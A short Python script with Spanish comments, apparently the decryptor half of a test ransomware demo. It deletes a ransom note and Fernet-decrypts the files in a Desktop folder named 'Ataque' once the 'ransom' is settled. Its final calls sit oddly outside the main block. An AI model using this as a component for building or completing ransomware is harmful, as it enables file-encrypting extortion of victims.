from cryptography.fernet import Fernet
import os
import getpass


# Para la prueba de este programa es necesario la creacion de una carpeta
# en el escritorio de nombre "Ataque" y dentro de esta otra carpeta
# de nombre "Primera prueba"

# Este archivo se usa una vez se ha concluido el rescate


# Genera la key con la que se encriptara los archivos y la exporta en un archivo con extension key
def generarkey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


# Permite obtener el key que permite la encripcion y la desencripcion
def retornarkey():
    return open("key.key", "rb").read()


# Permite la desencripcion de los archivos contenidos en el directorio indicado
# esto se realiza a traves de la desencripcion de Fernet
def decrypt(items, key):
    i = Fernet(key)
    for x in items:
        with open(x, "rb") as file:
            file_data = file.read()
        data = i.decrypt(file_data)

        with open(x, "wb") as file:
            file.write(data)


# Permite que el codigo se ejecute en el modulo es el equivalente a la funcion main en JAVA
if __name__ == "__main__":
    archivos = 'C:\\Users\\' + getpass.getuser() + '\\Desktop\\Ataque\\Primera prueba'
    os.remove(archivos + "\\" + "readme.txt")
    items = os.listdir(archivos)
    archivos_2 = [archivos + "\\" + x for x in items]

key = retornarkey()

decrypt(archivos_2, key)
